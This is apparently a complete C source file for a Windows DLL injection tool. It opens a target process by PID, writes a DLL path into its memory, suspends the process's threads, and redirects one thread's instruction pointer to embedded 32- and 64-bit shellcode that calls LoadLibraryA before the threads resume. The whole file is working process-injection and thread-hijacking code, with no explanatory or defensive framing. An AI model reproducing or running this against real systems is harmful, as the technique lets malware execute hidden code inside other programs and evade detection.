//64 bit process uses fastcall convention: https://stackoverflow.com/questions/20389132/how-to-properly-save-and-restore-thread-context-on-64-bit-process-windows

#ifdef _M_IX86
#define _WIN32_WINNT_WINXP
#define CONTEXTSTRUC CONTEXT
#define REGISTER_SIZE 4
#define GetThreadContextFunc GetThreadContext
#define SetThreadContextFunc SetThreadContext
#define SuspendThreadFunc SuspendThread
#define REG_IP Eip
#define REG_SP Esp
#define REG_BP Ebp
#elif defined(_M_X64)
/*
#define CONTEXTSTRUC WOW64_CONTEXT
#define GetThreadContextFunc Wow64GetThreadContext 
#define SetThreadContextFunc Wow64SetThreadContext
#define SuspendThreadFunc Wow64SuspendThread 
*/
#define CONTEXTSTRUC CONTEXT
#define GetThreadContextFunc GetThreadContext 
#define SetThreadContextFunc SetThreadContext
#define SuspendThreadFunc SuspendThread 
#define REGISTER_SIZE 8
#define REG_IP Rip
#define REG_SP Rsp
#define REG_BP Rbp
#endif


#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>



// Our shellcode 

#define ENDOFSHELL (sizeof(shellcode)-1) //-1 accounts for \0 at end of string
#ifdef _M_IX86
#define PROCSTART (ENDOFSHELL-8)
#define DLLSTART (ENDOFSHELL-4)
unsigned char shellcode[] =
"\x50\x53\x51\x52\x55\x57\x56\xe8\x00\x00\x00\x00\x58\x89\xc3"
"\xb8\x2a\x00\x00\x00\x0f\xb6\xc0\x01\xd8\x8b\x00\x50\xb8\x26"
"\x00\x00\x00\x0f\xb6\xc0\x01\xd8\x8b\x00\xff\xd0\x5e\x5f\x5d"
"\x5a\x59\x5b\x58\xc3\x78\x56\x34\x12\xff\xbe\xad\xde";

#elif defined(_M_X64)
#define PROCSTART (ENDOFSHELL-16)
#define DLLSTART (ENDOFSHELL-8)
unsigned char shellcode[] =
"\x50\x53\x51\x52\x55\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53"
"\x41\x54\x41\x55\x41\x56\x48\x8d\x05\x00\x00\x00\x00\x90\x48"
"\x89\xc3\x48\xc7\xc0\x4e\x00\x00\x00\x48\x0f\xb6\xc0\x48\x01"
"\xd8\x48\x8b\x08\x48\xc7\xc0\x46\x00\x00\x00\x48\x0f\xb6\xc0"
"\x48\x01\xd8\x48\x8b\x00\x48\x83\xec\x20\xff\xd0\x48\x83\xc4"
"\x20\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58"
"\x5e\x5f\x5d\x5a\x59\x5b\x58\xc3\x88\x77\x66\x55\x44\x33\x22"
"\x11\x66\x55\x66\x55\xef\xbe\xad\xde";
#endif


int version();
FARPROC loadLibraryAddress();
LPVOID virtualAlloc(HANDLE hProcess, char *dll);
BOOL writeDllProcessMemory(HANDLE hProcess, LPVOID virtualAlloc, char *dll);
VOID shellcodeMethod(HANDLE hProcess, FARPROC loadLibAddr, FARPROC dllAddr);
BOOL SuspendResumeAllThread(BOOL issuspend, HANDLE hProcess, DWORD* pTID);
void DumpReg(CONTEXTSTRUC*);

int main(int argc, char *argv[]) {
	if (argc != 3) {
		printf("Usage: %s <absolute path of DLL> <target process ID>\n", argv[0]);
		exit(0);
	}



	char* dll = argv[1];
	int pid = atoi(argv[2]);

	// Enable debug privilege for xp (inject in system process)
	if (version() < 6) {
		HANDLE hProcess = GetCurrentProcess();
		HANDLE hToken;
		if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
			SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
			CloseHandle(hToken);
			printf("[+] Debug privilege\n");
		}
	}


	// Attach to the process through his PID
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[-] OpenProcess failed\n");
		exit(0);
	}
	else
		printf("[+] OpenProcess success\n");

	FARPROC llAddr = loadLibraryAddress();
	LPVOID dllAddr = virtualAlloc(hProcess, dll);
	writeDllProcessMemory(hProcess, dllAddr, dll);

	//createRemoteThreadMethod(hProcess, llAddr, dllAddr);
	shellcodeMethod(hProcess, llAddr, dllAddr);
	//apcMethod(hProcess, dllAddr, llAddr);
	CloseHandle(hProcess);

	return 0;
}

// Find the version of the os
int version(){
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	return osvi.dwMajorVersion;
}

// SetPrivilege enables/disables process token privilege.
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){
	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid)){
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
		//
		//  Enable the privilege or disable all privileges.
		//
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, (DWORD)NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			//
			//  Check to see if you have proper access.
			//  You may get "ERROR_NOT_ALL_ASSIGNED".
			//
			bRet = (GetLastError() == ERROR_SUCCESS);
	}
	return bRet;
}

// Determine the address of LoadLibraryA
FARPROC loadLibraryAddress(){

	FARPROC LLA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
	if (LLA == NULL) {
		printf("[-] LoadLibraryA address not found");
		exit(0);
	}
	else
		printf("[+] LoadLibraryA address found 0x%08x\n", LLA);
	return LLA;
	
}

// Allocate Memory for the DLL
LPVOID virtualAlloc(HANDLE hProcess, char *dll){
	LPVOID VAE = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(dll), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (VAE == NULL) {
		printf("[-] VirtualAllocEx failed");
		exit(0);
	}
	else
		printf("[+] VirtualAllocEx  0x%08x\n", VAE);
	return VAE;
}

// Copy the DLL into the targeted process memory allocation
BOOL writeDllProcessMemory(HANDLE hProcess, LPVOID dllAddr, char *dll){
	BOOL WPM = WriteProcessMemory(hProcess, dllAddr, dll, strlen(dll), NULL);
	int err = GetLastError();
	if (!WPM) {
		printf("[-] WriteProcessMemory failed, error code:%d\n", err);
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");
	return WPM;
}


// Suspend process, inject shellcode, redirect eip and resume process
VOID shellcodeMethod(HANDLE hProcess, FARPROC llAddr, FARPROC dllAddr)
{
	DWORD TID = 0;
	int err;

	if(!SuspendResumeAllThread(TRUE, hProcess,&TID))
	{
		printf("[-] error occured during threads suspension\n");
		exit(0);
	}
	

	// Inject
	CONTEXTSTRUC lpContext;
#ifdef _M_IX86
	lpContext.ContextFlags = CONTEXT_FULL;
#elif defined(_M_X64)
	lpContext.ContextFlags = WOW64_CONTEXT_FULL;
	//lpContext.ContextFlags = CONTEXT_FULL;
#endif
	HANDLE targetThread = NULL;

	// Open targeted thread
	
	targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
	if (targetThread == NULL){
		printf("[-] OpenThread failed\n");
		exit(0);
	}
	else
		printf("[+] Target thread 0x%08X\n", targetThread);

	// Get eip & esp adresses
	if (!GetThreadContextFunc(targetThread, &lpContext)){
		err = GetLastError();
		SuspendResumeAllThread(FALSE, hProcess, &TID);
		printf("[-] GetThreadContext failed\n");
		printf("error code:%d\n", err);
		exit(0);
	}
	else
	{
		DumpReg(&lpContext);
	}
		

	// Save eip, esp & ebp
	// Allocate 4 bytes on the top of the stack for the RET
	// lpContext.Esp -= sizeof(unsigned int);
	lpContext.REG_SP -= REGISTER_SIZE;
	if (!WriteProcessMemory(hProcess, (LPVOID)lpContext.REG_SP, (LPCVOID)&lpContext.REG_IP, REGISTER_SIZE, NULL)) 
	{
		err = GetLastError();
		SuspendResumeAllThread(FALSE, hProcess, &TID);
		printf("[-] WriteProcessMemory failed, error code:%d\n",err);
		exit(0);
	}
	else
	{
		printf("[+] WriteProcessMemory success\n");
	}
	
	DumpReg(&lpContext);
	

	// Patch the shellcode with the addresses of LoadLibraryA & the DLL in targeted process memory
	
#ifdef _M_IX86
	printf("dll string address: %08x\n", dllAddr);
	printf("Shell code size:%d", ENDOFSHELL);
	shellcode[PROCSTART    ] = ((unsigned __int32)llAddr & 0xFF);
	shellcode[PROCSTART + 1] = (((unsigned __int32)llAddr >> 8) & 0xFF);
	shellcode[PROCSTART + 2] = (((unsigned __int32)llAddr >> 16) & 0xFF);
	shellcode[PROCSTART + 3] = (((unsigned __int32)llAddr >> 24) & 0xFF);
	shellcode[DLLSTART    ] = ((unsigned __int32)dllAddr & 0xFF);
	shellcode[DLLSTART + 1] = (((unsigned __int32)dllAddr >> 8) & 0xFF);
	shellcode[DLLSTART + 2] = (((unsigned __int32)dllAddr >> 16) & 0xFF);
	shellcode[DLLSTART + 3] = (((unsigned __int32)dllAddr >> 24) & 0xFF);
#else defined(_M_X64)
	printf("shell code size:%d\n", ENDOFSHELL);
	printf("dll str loc:%016x\n", dllAddr);
	printf("LoadLibrary loc:%016x\n", llAddr);
	printf("P %d DLL %d\n", PROCSTART, DLLSTART);
	shellcode[PROCSTART    ] = (((unsigned __int64)llAddr )      & 0xFF);
	shellcode[PROCSTART + 1] = (((unsigned __int64)llAddr >>  8) & 0xFF);
	shellcode[PROCSTART + 2] = (((unsigned __int64)llAddr >> 16) & 0xFF);
	shellcode[PROCSTART + 3] = (((unsigned __int64)llAddr >> 24) & 0xFF);
	shellcode[PROCSTART + 4] = (((unsigned __int64)llAddr >> 32) & 0xFF);
	shellcode[PROCSTART + 5] = (((unsigned __int64)llAddr >> 40) & 0xFF);
	shellcode[PROCSTART + 6] = (((unsigned __int64)llAddr >> 48) & 0xFF);
	shellcode[PROCSTART + 7] = (((unsigned __int64)llAddr >> 56) & 0xFF);

	
	shellcode[DLLSTART   ] = (((unsigned __int64)dllAddr) & 0xFF);
	shellcode[DLLSTART + 1] = (((unsigned __int64)dllAddr >> 8) & 0xFF);
	shellcode[DLLSTART + 2] = (((unsigned __int64)dllAddr >> 16) & 0xFF);
	shellcode[DLLSTART + 3] = (((unsigned __int64)dllAddr >> 24) & 0xFF);
	shellcode[DLLSTART + 4] = (((unsigned __int64)dllAddr >> 32) & 0xFF);
	shellcode[DLLSTART + 5] = (((unsigned __int64)dllAddr >> 40) & 0xFF);
	shellcode[DLLSTART + 6] = (((unsigned __int64)dllAddr >> 48) & 0xFF);
	shellcode[DLLSTART + 7] = (((unsigned __int64)dllAddr >> 56) & 0xFF);
	
#endif
	
	// Display shellcode
	int i;
	printf("[+] Shellcode:\n");
	for (i = 0; i < sizeof(shellcode); i++)
	{
		if (i % 16 == 0)
		{
			printf("\n");
		}
		printf("%02x ", shellcode[i]);
	}
		
	printf("\n");

	// Allocate memory in the targeted process for our shellcode
	LPVOID shellcodeAddress;
	shellcodeAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL){
		printf("[-] VirtualAllocEx failed");
		exit(0);
	}
	else
		printf("[+] Allocating %d bytes for our shellcode\n", sizeof(shellcode));

	// Write the shellcode into the targeted thread
	if (!WriteProcessMemory(hProcess, shellcodeAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL)){
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");

	// Redirect eip to the shellcode address
	lpContext.REG_IP = (DWORD)shellcodeAddress;
	DumpReg(&lpContext);
	if (!SetThreadContextFunc(targetThread, &lpContext))
	{
		printf("[-] SetThreadContext failed\n");
		exit(0);
	}
	else
		printf("[+] SetThreadContext success\n");

	SuspendResumeAllThread(FALSE, hProcess, &TID);
}

BOOL SuspendResumeAllThread(BOOL issuspend, HANDLE hProcess, DWORD* pTID)
{
	// Takes a snapshot of all threads in the system, 0 to current process
	int err;


	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	err = GetLastError();
	if (hThreadSnap == INVALID_HANDLE_VALUE) {
		printf("[-] CreateToolhelp32Snapshot failed\n");
		printf("last error:%d\n", err);
		return FALSE;
	}
	else
		printf("[+] CreateToolhelp32Snapshot success\n");

	// Retrieves information about the first thread of any process encountered in a system snapshot.
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	if (Thread32First(hThreadSnap, &te32) == FALSE) {
		printf("[-] Thread32First failed\n");
		return FALSE;
	}
	else
		printf("[+] Thread32First success\n");

	HANDLE hThread;
	do {
		if (te32.th32OwnerProcessID == GetProcessId(hProcess)) {
			
			if (*pTID == 0)
			{ 
				(*pTID) = te32.th32ThreadID;
			}

				

			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			
			if (hThread == NULL) {
				printf("[-] OpenThread failed\n");
				return FALSE;
			}
			else {
				if (issuspend)
				{
					SuspendThreadFunc(hThread);
					CloseHandle(hThread);
					printf("[+] Suspend thread 0x%08X\n", te32.th32ThreadID);
				}
				else
				{
					ResumeThread(hThread);
					if (te32.th32ThreadID == *pTID)
						WaitForSingleObject(hThread, 5000);
					CloseHandle(hThread);
					printf("[+] Resume\n");
				}
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));
	CloseHandle(hThreadSnap);
	return TRUE;
}

void DumpReg(CONTEXTSTRUC *ptr)
{
	
#ifdef _M_IX86
	printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", ptr->REG_IP, ptr->REG_SP, ptr->REG_BP);
#elif defined(_M_X64)
	printf("\tRIP : 0x%016x\n\tRSP : 0x%016x\n\tRBP : 0x%016x\n", ptr->REG_IP, ptr->REG_SP, ptr->REG_BP);
#endif

}
